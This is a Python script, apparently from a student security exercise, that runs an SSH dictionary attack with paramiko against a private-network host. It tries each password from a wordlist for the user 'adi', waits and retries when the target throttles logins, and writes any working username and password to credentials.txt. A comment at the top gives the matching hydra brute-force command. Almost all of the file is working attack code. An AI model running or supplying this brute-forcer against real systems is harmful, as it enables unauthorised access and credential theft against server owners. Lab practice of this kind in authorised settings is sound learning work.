#with hydra - hydra -l adi -P /home/elad/elad.shem-tov/cyber/src/bruteForce/ex2/dictssh.txt 10.1.0.192 ssh -t 4
 
import paramiko
import socket
import time

def is_ssh_open(hostname, username, password):
    #initialize SSH client 
    client = paramiko.SSHClient()
    #add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:   #when the host is unreachable during the 3 seconds.
    # this is when host is unreachable
        print(f"[!] Host: {hostname} is unreachable, timed out")
        return False
    except paramiko.AuthenticationException:  #when the username and password combination is incorrect.
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:   #the victim entered cooldown
        print(f"[*] Quota exceeded, retrying with delay...")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
       # connection was established - SUCCESS 
        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return True


# main function:

def DictAttack(pass_dic, username, host_ip):
    #read the password word file,
    fd = open(pass_dic)
    passlist1 = fd.read().splitlines()
    for password in passlist1:
        if is_ssh_open(host_ip, username, password):
       # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{username}@{host_ip}:{password}")
            break
    fd.close()


DictAttack("/home/elad/elad.shem-tov/cyber/src/bruteForce/ex2/dictssh.txt", "adi", "10.1.0.192")


